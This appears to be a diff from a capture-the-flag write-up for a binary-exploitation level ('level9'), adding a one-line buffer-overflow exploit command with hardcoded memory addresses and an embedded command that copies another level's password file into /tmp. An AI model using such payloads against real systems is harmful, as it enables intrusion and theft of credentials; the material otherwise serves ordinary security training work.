@@ -12,3 +12,5 @@ truc3 [esp + 0x10] = truc1
 
 _ZN1N13setAnnotationEPc(esp + 0x14, esp +)
 
+/home/user/level9/level9 $(python -c "print('\x60\x60\xd8\xb7' + 'OSEF' + '\x58\x7c\xea\xb7' + 'DDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAA' + '\xce\xf7\xff\xbf' + '`cat /home/user/bonus0/.pass >/tmp/flag`MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYY' + '\x5e\x86\x04\x08')")
+
